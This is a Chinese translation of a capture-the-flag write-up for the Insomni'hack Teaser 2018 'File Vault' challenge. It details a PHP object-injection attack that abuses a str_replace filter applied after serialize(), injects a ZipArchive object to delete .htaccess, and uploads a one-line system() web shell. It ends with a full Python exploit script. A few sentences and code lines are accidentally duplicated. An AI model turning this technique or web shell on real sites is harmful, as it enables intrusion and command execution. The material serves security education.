> 原文链接: https://www.anquanke.com//post/id/95896 


# Insomni'hack Teaser 2018比赛Write Up：File Vault题目


                                阅读量   
                                **156597**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者corb3nik，文章来源：corb3nik.github.io
                                <br>原文地址：[http://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault](http://corb3nik.github.io/blog/insomnihack-teaser-2018/file-vault)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p2.ssl.qhimg.com/t018d66a8df0cc3b44b.png)](https://p2.ssl.qhimg.com/t018d66a8df0cc3b44b.png)



## 前言

Insomni’hack Teaser 2018是瑞士举办的一场CTF比赛，今年已经是第六届。该比赛主要考察Pwning、Web和加密相关的题目，本次比赛的前六支队伍都将获邀参加在日内瓦举行的Insomni’hack 2018会议。

赛事官网为：[https://teaser.insomnihack.ch](https://teaser.insomnihack.ch) 。



## 题目描述

通过File Vault，用户可以将文件安全地存储在系统上，并且支持对部分文件进行检索。在本题目中，其中所有的数据都已经预先部署好。



## 挑战内容

File Vault是一个沙盒文件管理器，允许用户上传文件，同时还允许查看文件的元数据。在本次比赛期间，这道挑战题目是我的最爱。即使已经提供了相关的源代码，但这一题仍然有非常多的独创性，可以供我们学习探讨。

如上所述，该题目向选手提供了应用程序的源代码，用户可以进行下面五类操作：
1. 主页 / Home（查看主页）；
1. 上传 / Upload（上传新文件）；
1. 更改名称 / Change Name（重命名现有文件）；
1. 打开 / Open（查看现有文件的元数据）；
1. 重置 / Reset（删除沙盒中的所有文件）
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://corb3nik.github.io/assets/img/insomnihack-teaser-2018/main.png)

其中的每一个操作，都是在沙盒环境中执行的。这里的沙盒，是程序生成的用户专属文件夹，其生成代码如下：

```
$sandbox_dir = 'sandbox/'.sha1($_SERVER['REMOTE_ADDR']);
```

该沙盒还可以防止PHP执行，以生成的.htaccess文件为例，我们可以看到其中的php_flag engine off指令：

```
if(!is_dir($sandbox_dir))
mkdir($sandbox_dir);
if(!is_file($sandbox_dir.'/.htaccess'))
file_put_contents($sandbox_dir.'/.htaccess', "php_flag engine off");
```



## Web应用的工作原理

每一个上传的文件，都由PHP中的VaultFile对象表示：

```
class VaultFile `{`
    function upload($init_filename, $content) `{`
        global $sandbox_dir;
        $fileinfo = pathinfo($init_filename);
        $fileext = isset($fileinfo['extension']) ? ".".$fileinfo['extension'] : '.txt';
        file_put_contents($sandbox_dir.'/'.sha1($content).$fileext, $content);
        $this-&gt;fakename = $init_filename;
        $this-&gt;realname = sha1($content).$fileext;
    `}`

    function open($fakename, $realname)`{`
        global $sandbox_dir;
        $fp = fopen($sandbox_dir.'/'.$realname, 'r');
        $analysis = "The file named " . htmlspecialchars($fakename).
                    " is located in folder $sandbox_dir/$realname.
                      Here all the informations about this file : ".
                    print_r(fstat($fp),true);
        return $analysis;
    `}`
`}`
```

在上传新文件时，将使用以下属性来创建VaultFile：

fakename：用户上传文件的原始文件名；

realname：自动生成的文件名，用于在磁盘上存储文件。

通过Open操作查看文件时，fakename用于文件名的显示，而在文件系统中所保存的文件，实际上其文件名为realname中的名称。

然后，会将VaultFile对象添加到数组，通过自定义的s_serialize()函数对其进行序列化，并通过文件Cookie返回给用户。当用户想要查看文件时，Web应用程序会获取用户的Cookie，通过s_unserialized()函数对VaultFile对象的数组反序列化，随后对其进行相应的处理。

下面是VaultFile对象的一个示例：

```
a:1:`{`i:0;O:9:"VaultFile":2:`{`s:8:"fakename";s:4:"asdf";s:8:"realname";s:44:"6322fe412ca3cd526522d9d7fde5f2a383ca4c3f.txt";`}``}`e28cae7d9495e4f9e9c65e268f8ac4d975f4c94e02b04fa1144a9400979dae23
```

以下是用于生成上述序列化对象的相关代码：

```
function s_serialize($a, $secret) `{`
  $b = serialize($a);
  $b = str_replace("../","./",$b);
  return $b.hash_hmac('sha256', $b, $secret);
`}`;

function s_unserialize($a, $secret) `{`
  $hmac = substr($a, -64);
  if($hmac === hash_hmac('sha256', substr($a, 0, -64), $secret))
    return unserialize(substr($a, 0, -64));
`}`

// ...
case 'home':
default:
  $content =  "[Some irrelevant HTML code]";
  $files = s_unserialize($_COOKIE['files'], $secret);
  if($files) `{`
      $content .= "&lt;ul&gt;";
      $i = 0;
      foreach($files as $file) `{`
          $content .= "[More HTML code displaying the contents of $file]";
          $i++;
      `}`
      $content .= "&lt;/ul&gt;";
  `}`
  break;

case 'upload':
  if($_SERVER['REQUEST_METHOD'] === "POST") `{`
      if(isset($_FILES['vault_file'])) `{`
          $vaultfile = new VaultFile;
          $vaultfile-&gt;upload($_FILES['vault_file']['name'],
            file_get_contents($_FILES['vault_file']['tmp_name']));
          $files = s_unserialize($_COOKIE['files'], $secret);
          $files[] = $vaultfile;
          setcookie('files', s_serialize($files, $secret));
          header("Location: index.php?action=home");
          exit;
      `}`
  `}`
  break;
```

在这里，由于用户控制的Cookie被直接发送到s_unserialize()函数，所以我们可以尝试寻找PHP对象注入漏洞。

在此我就不再详细介绍对象注入的原理，大家可以参考我此前的文章《Practical PHP Object Injection》：[https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf](https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf)



## s_serialize()和s_unserialize()函数

在开始解题之前，我认为这是一个典型的对象序列化问题。然而，在阅读了源代码之后，我很快就意识到这远比想象的更复杂，同时也理解了为什么目前仅有5个团队解决了这道题。

首先，即使s_*serialize函数确实可以接受用户控制的参数，序列化后的对象也会被签名，并通过$secret进行验证。如果s_unserialize()函数中的签名无效，那么便不会对该对象进行反序列化操作：

```
function s_serialize($a, $secret) `{`
  $b = serialize($a);
  $b = str_replace("../","./",$b);
  return $b.hash_hmac('sha256', $b, $secret);
`}`;

function s_unserialize($a, $secret) `{`
  $hmac = substr($a, -64);
  if($hmac === hash_hmac('sha256', substr($a, 0, -64), $secret))
    return unserialize(substr($a, 0, -64));
`}`
```

因此，尽管我们可以将任意的PHP对象传递给unserialize()函数，但我们并不能控制这些对象，因为它们将不会被返回。

此外，源代码中没有**wakeup()或**destruct()这样的函数，因此我们也不能使用此前常用的一些方法。仅仅通过unserialize()调用，是无法攻破这一题的。

最后，就算是我们成功伪造了拥有正确签名的序列化对象，我们也没有办法去任意地读/写文件。



## 发现漏洞：破坏序列化对象

随着不断探索，我们发现了这一应用程序中的漏洞，具体代码如下：

```
function s_serialize($a, $secret) `{`
  $b = serialize($a);
  $b = str_replace("../","./",$b);
  return $b.hash_hmac('sha256', $b, $secret);
`}`;
```

代码的作者添加了一个str_replace()调用，用来过滤掉../序列。这就存在一个问题，str_replace调用是在一个序列化的对象上执行的，而不是一个字符串。

问题的关键在于，这是一个序列化数组的片段。

```
php &gt; $array = array();
php &gt; $array[] = "../";
php &gt; $array[] = "hello";
php &gt; echo serialize($array);
a:2:`{`i:0;s:3:"../";i:1;s:5:"hello";`}`
```

接下来，让我们使用../过滤器：

```
php &gt; echo str_replace("../","./", serialize($array));
a:2:`{`i:0;s:3:"./";i:1;s:5:"helloa:2:`{`i:0;s:3:"./";i:1;s:5:"hello";`}`

```

通过过滤，确实已经将“../”改为了“./”，然而，序列化字符串的大小并没有改变。s:3:”./“;显示的字符串大小为3，然而实际上它的大小是2！

当这个损坏的对象被unserialize()处理时，PHP会将序列化对象(“)中的下一个字符视为其值的一部分：

```
a:2:`{`i:0;s:3:"./";i:1;s:5:"hello";`}`
           ^  --- &lt;== The value parsed by unserialize() is ./"

```

在这里，如果我们添加更多的../，就会有更多的字符被unserialize()在这里，如果我们添加更多的../，就会有更多的字符被unserialize()解析。

```
php &gt; $array = array();
php &gt; $array[] = "../../../../../../../../../../../../";
php &gt; $array[] = "hello";
php &gt; echo serialize($array);
a:2:`{`i:0;s:36:"../../../../../../../../../../../../";i:1;s:5:"hello";`}`

php &gt; echo str_replace("../","./", serialize($array));
a:2:`{`i:0;s:36:"././././././././././././";i:1;s:5:"hello";`}`
           ^^  ------------------------------------ &lt;=== Parsed by unserialize()

php &gt; unserialize('a:2:`{`i:0;s:36:"././././././././././././";i:1;s:5:"hello";`}`');
PHP Notice:  unserialize(): Error at offset 51 of 58 bytes in php shell code on line 1

Notice: unserialize(): Error at offset 51 of 58 bytes in php shell code on line 1
```

因此，在这一题的挑战中，我们可以借助../序列来重命名此前上传的文件，从而实现该漏洞的利用。Web应用程序会顺畅地实现重命名操作，并会对包含已损坏对象的新Cookie进行因此，在这一题的挑战中，我们可以借助../序列来重命名此前上传的文件，从而实现该漏洞的利用。Web应用程序会顺畅地实现重命名操作，并会对包含已损坏对象的新Cookie进行签名。



## 伪造任意对象并签名

现在，我们可以对损坏的序列化对象进行签名，但在此之前，我们还是要弄清楚如何利用这一漏洞来对有效的对象进行签名。

请注意，在上文的最后一个例子中，我们是通过添加多个../字符串，最终溢出了数组中的下一个对象（““hello”）。

既然我们已经能够控制hello字符串，那么我们就可以用部分序列化对象来代替hello。我们可以将它视为SQL注入问题，必须匹配两端的引号，来保证查询的有效性。

下面是一个例子：

```
php &gt; $array = array();
php &gt; $array[] = "../../../../../../../../../../../../../";
php &gt; $array[] = 'A";i:1;s:8:"Injected';
php &gt; echo serialize($array);
a:2:`{`i:0;s:39:"../../../../../../../../../../../../../";i:1;s:20:"A";i:1;s:8:"Injected";`}`

php &gt; $x = str_replace("../", "./", serialize($array));
php &gt; echo $x;
a:2:`{`i:0;s:39:"./././././././././././././";i:1;s:20:"A";i:1;s:8:"Injected";`}`
               ---------------------------------------           --------

php &gt; print_r(unserialize($x));
Array
(
    [0] =&gt; ./././././././././././././";i:1;s:20:"A
    [1] =&gt; Injected
)
```

如你所见，一个新的“Injected”字符串已经被添加到反序列化的数组之中。我们在这个例子中，使用的字符串是“i:1;s:8:”Injected”，但同样，任何基元/对象都可以在这里使用。

在File Vault中，情况与之几乎相同。我们需要的就是一个数组，在这个数组中我们破坏了第一个对象，从而控制了第二个对象。

我们可以通过上传两个文件来实现漏洞的利用。就像上面的例子一样，我们具体操作如下：
1. 上传两个文件，创建两个VaultFile对象；
1. 用部分序列化的对象，重命名第二个VaultFile对象中的fakename；
<li>借助../序列，重命名第一个VaultFile对象中的fakename，使其到达第二个VaultFile对象。<br>
请注意，由于我们现在使用的是Web应用程序的正常功能来执行上述操作，所以就不用再考虑签名的问题，这些操作一定是合法的。</li>


## 使用任意数据伪造序列化对象

现在，我们就可以使用任意数据，来伪造我们自己的序列化对象。

在这一步骤中，我们需要解决的是一个经典的对象注入问题，但在这里，并没有太多技巧或者捷径可以供我们使用。

到目前为止，我们几乎已经用到了应用中所有的功能，但还有一个没有用过，那就是Open。以下是Open的相关代码：

```
case 'open':
    $files = s_unserialize($_COOKIE['files'], $secret);
    if(isset($files[$_GET['i']]))`{`
        echo nl2br($files[$_GET['i']]-&gt;open($files[$_GET['i']]-&gt;fakename,
                            $files[$_GET['i']]-&gt;realname));
    `}`
  exit;
```

Open操作会从$files数组中获取一个对象，并使用$object-&gt;fakename和$object-&gt;realname这两个参数来调用open()函数。

我们知道，可以在$files数组中注入任何对象（就像之前注入的“Injected”字符串一样）。但如果我们注入的不是VaultFile对象，会发生什么？

可以看到，open()这一方法名非常常见。如果我们能够在PHP中找到一个带有open()方法的标准类，那么就可以欺骗Web应用去掉用这个类的open()方法，而不再调用VaultFile的方法。

我们尝试对下面的操作进行替换：

```
&lt;?php
$array = new array();
$array[] = new VaultFile();
$array[0]-&gt;open($array[0]-&gt;fakename, $array[0]-&gt;realname);

```

可以通过欺骗Web应用程序，来实现这一点：

```
&lt;?php
$array = new array();
$array[] = new SomeOtherFile();
$array[0]-&gt;open($array[0]-&gt;fakename, $array[0]-&gt;realname);

```

我们先来列出所有包含open()方法的类：

```
$ cat list.php
&lt;?php
  foreach (get_declared_classes() as $class) `{`
    foreach (get_class_methods($class) as $method) `{`
      if ($method == "open")
        echo "$class-&gt;$methodn";
    `}`
  `}`
?&gt;
```

```
$ php list.php
SQLite3-&gt;open
SessionHandler-&gt;open
XMLReader-&gt;open
ZipArchive-&gt;open
```

经过寻找，我们一共发现有4个类带有open()方法。如果在$files数组中，注入这些类中任意一个的序列化对象，我们就可以通过带有特定参数的open动作，来调用这些类中的方法。

幸运的是，大部分类都能够对文件进行操作。回顾之前的研究过程，我们知道.htaccess会阻止我们执行PHP。所以，假如能通过某种方式删掉.htaccess文件，那这一题就搞定了。

现在，我们在本地去测试每个类的行为。经过一段时间的测试之后，我发现，ZipArchive-&gt;open方法可以删除目标文件，前提是我们需要将其第二个参数设定为“9”。

为什么要设定为9呢？原因在于， ZipArchive-&gt;open()的第二个参数是“指定其他选项”。而9对应的是ZipArchive::CREATE | ZipArchive::OVERWRITE。由于ZipArchive打算覆盖我们的文件，所以就会先对其进行删除。在此，感谢[@pagabuc](https://github.com/pagabuc)帮助我们解释了这一参数的具体意义。

那么现在，我们就可以使用ZipArchive-&gt;open()来删除.htaccess文件。



## 获得Shell

最激动人心的时刻到了，我们来开发最终的有效载荷。

我写了一个Python脚本，以对Web应用程序实现自动化操作。

```
#!/usr/bin/env python2

import requests
import urllib

URL = "http://filevault.teaser.insomnihack.ch/"
s = requests.Session()

def upload(name):
    files = `{`'vault_file': (name, 'GARBAGE')`}`
    params = `{` "action" : "upload" `}`
    s.post(URL, params=params, files=files)

def rename(index, new_name):
    data = `{` "newname" : new_name `}`
    params = `{`
        "action" : "changename",
        "i" : index
    `}`
    s.post(URL, params=params, data=data)

def open_file(index):
    params = `{`
        "action" : "open",
        "i" : index
    `}`
return s.get(URL, params=params).text
```

接下来，通过上传两个文件，来创建我们的VaultFile对象：

```
upload("A")
upload("B")
```

Web应用会将下面的Cookie发给我们：

```
a:2:`{`i:0;O:9:"VaultFile":2:`{`s:8:"fakename";s:1:"A";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";`}`i:1;O:9:"VaultFile":2:`{`s:8:"fakename";s:1:"B";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";`}``}`ce27b112cf5429bf6f09a905de8f4d110ab1ce6d39f27d4ec0226ab47c76721a
```

我们希望将恶意的部分序列化对象放在第二个fakename的开始。通过计算“A”与“B”之间的距离，得知第一个fakename和第二个fakename之间的距离是115个字符。

因此，为了到达第二个fakename，需要用115个”../“来重命名第一个fakename，我们稍后再进行这一步。

接下来，需要准备一个ZipArchive对象来注入这一Cookie。我们来创建一个对象：

```
php &gt; $zip = new ZipArchive();
php &gt; $zip-&gt;fakename = "sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";
php &gt; $zip-&gt;realname = "9";
php &gt; echo serialize($zip);
O:10:"ZipArchive":7:`{`s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:0:"";`}`
```

由于我们的目的是调用ZipArchive-&gt;open(“.htaccess”, “9”)，所以就添加了fakename和realname属性，其中包含了将要使用的参数。

如果像这样进行对象注入，会留下一个realname的小尾巴，而这可能会与我们之前所创建的伪造的realname相冲突。

```
"...Our malicious ZipArchiver]";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt"
                              ------------------------------(67 chars)---------------------------
```

实际上，可以通过更新序列化的ZipArchive-&gt;comment参数的大小，来删除这个realname的小尾巴。尾部的大小为67，所以我们据此来更新comment的大小。

```
O:10:"ZipArchive":7:`{`s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"";`}`
```

现在，万事具备。接下来对第二个VaultFile-&gt;fakename进行重命名。回到我们的Python脚本：

```
# We end the first object with a dummy parameter, then start the second object
# with our ZipArchive
serialized_injection = '";s:1:"e";s:0:"";`}`i:1;O:10:"ZipArchive":7:`{`s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"'

rename(1, serialized_injection)
```

接下来对第一个VaultFile-&gt;fakename进行重命名：

```
newname = "../" * 115 # To overwrite fakename #2
rename(0, newname)
```

最后，我们会收到如下Cookie：

```
a:2:`{`i:0;O:9:"VaultFile":2:`{`s:8:"fakename";s:345:"./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";`}`i:1;O:9:"VaultFile":2:`{`s:8:"fakename";s:245:"";s:1:"e";s:0:"";`}`i:2;O:10:"ZipArchive":7:`{`s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";`}``}`6f72e63954ac6e08c3ebc6e4abdff60956a82d9ebc556873410c9ef456098b69
```

上传Shell（由于.htaccess文件还没有被删除，所以它不会被执行）：

[![](https://corb3nik.github.io/assets/img/insomnihack-teaser-2018/before_shell.png)](https://corb3nik.github.io/assets/img/insomnihack-teaser-2018/before_shell.png)

借助Unserialize()对Cookie进行反序列化，并触发ZipArchive-&gt;open()函数调用：

[![](https://corb3nik.github.io/assets/img/insomnihack-teaser-2018/delete_htaccess.png)](https://corb3nik.github.io/assets/img/insomnihack-teaser-2018/delete_htaccess.png)

最后，再次访问Shell：

[![](https://corb3nik.github.io/assets/img/insomnihack-teaser-2018/after_shell.png)](https://corb3nik.github.io/assets/img/insomnihack-teaser-2018/after_shell.png)

得到Flag：INS`{`gr4tz_f0r_y0ur_uns3ri4l1z1ng_tal3nts`}`



## 源代码

以下是我的完整Python源代码：

```
#!/usr/bin/env pyth#!/usr/bin/env python2

import requests
import urllib

URL = "http://filevault.teaser.insomnihack.ch/"
s = requests.Session()

def upload(name, content="GARBAGE"):
    files = `{`'vault_file': (name, content)`}`
    params = `{` "action" : "upload" `}`
    s.post(URL, params=params, files=files)

def rename(index, new_name):
    data = `{` "newname" : new_name `}`
    params = `{`
        "action" : "changename",
        "i" : index
    `}`
    s.post(URL, params=params, data=data)

def open_file(index):
    params = `{`
        "action" : "open",
        "i" : index
    `}`
    return s.get(URL, params=params).text

newname = "../" * 115 # To overwrite fakename #2
serialized_injection = '";s:1:"e";s:0:"";`}`i:1;O:10:"ZipArchive":7:`{`s:8:"fakename";s:58:"sandbox/b630d75c8dcfee915aec97cc3bb5d1d4c782345b/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"'

# Upload 2 files
upload("A")
upload("B")

# Rename to inject serialized ZipArchiver
rename(1, serialized_injection)
rename(0, newname)

# Upload a shell
upload("shell.php", "&lt;?php system($_GET[cmd]); ?&gt;")

# Cookie received
print " === Cookie === "
print urllib.unquote(s.cookies['files'])

# Trigger .htaccess removal
open_file(1)

shell_url = URL + "sandbox/b630d75c8dcfee915aec97cc3bb5d1d4c782345b/fe95113d494997061044e7142af542e84f3eebbf.php"

response = requests.get(shell_url, params=`{`"cmd" : "cat /flag"`}`)
flag = response.text
print flag
```
